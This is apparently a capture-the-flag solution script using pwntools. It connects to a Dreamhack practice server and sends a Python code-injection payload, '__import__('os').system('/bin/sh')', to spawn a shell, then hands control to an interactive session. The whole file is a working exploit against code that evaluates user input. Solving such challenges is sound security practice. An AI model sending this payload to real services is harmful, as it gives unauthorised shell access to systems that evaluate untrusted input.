from pwn import *

r = remote('host3.dreamhack.games', 14579)
payload = "__import__('os').system('/bin/sh') + 0"
r.sendline(payload)
r.interactive()
 